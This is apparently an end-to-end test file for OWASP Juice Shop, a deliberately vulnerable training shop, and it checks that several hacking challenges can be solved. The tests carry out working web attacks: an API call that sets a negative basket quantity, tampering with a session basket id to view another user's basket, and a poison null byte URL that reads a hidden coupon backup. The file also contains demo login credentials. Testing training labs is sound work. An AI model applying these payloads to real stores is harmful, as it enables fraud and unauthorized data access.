'use strict';

var insecurity = require('../../lib/insecurity');

describe('/#/basket', function () {

    describe('as admin', function () {

        protractor.beforeEach.login({email: 'admin@juice-sh.op', password: 'admin123'});

        describe('challenge "negativeOrder"', function () {

            it('should be possible to update a basket to a negative quantity via the Rest API', function () {
                browser.ignoreSynchronization = true;
                browser.executeScript('var $http = angular.injector([\'myApp\']).get(\'$http\'); $http.put(\'/api/BasketItems/1\', {quantity: -100});');
                browser.driver.sleep(1000);

                browser.get('/#/basket');
                browser.ignoreSynchronization = false;

                var productQuantities = element.all(by.repeater('product in products').column('basketItem.quantity'));
                expect(productQuantities.first().getText()).toMatch(/-100/);
            });

            it('should be possible to place an order with a negative total amount', function () {
                element(by.id('checkoutButton')).click();
            });

            protractor.expect.challengeSolved({challenge: 'negativeOrder'});

        });

        describe('challenge "accessBasket"', function () {

            it('should access basket with id from cookie instead of the one associated to logged-in user', function () {
                browser.executeScript('window.sessionStorage.bid = 3;');

                browser.get('/#/basket');

                // TODO Verify functionally that it's not the basket of the admin
            });

            protractor.expect.challengeSolved({challenge: 'accessBasket'});

        });

    });

    describe('as jim', function () {

        protractor.beforeEach.login({email: 'jim@juice-sh.op', password: 'ncc-1701'});

        describe('challenge "forgedCoupon"', function () {

            it('should be able to access file /public/ftp/coupons_2013.md.bak with poison null byte attack', function () {
                browser.driver.get(browser.baseUrl + '/public/ftp/coupons_2013.md.bak%2500.md');
            });

            it('should be possible to enter a coupon that gives an 80% discount', function () {
                browser.get('/#/basket');
                element(by.id('collapseCouponButton')).click();
                element(by.model('coupon')).sendKeys(insecurity.generateCoupon(new Date(), 90));
                element(by.id('applyCouponButton')).click();
            });

            it('should be possible to place an order with a forged coupon', function () {
                element(by.id('checkoutButton')).click();
            });

            protractor.expect.challengeSolved({challenge: 'forgedCoupon'});

        });

    });



});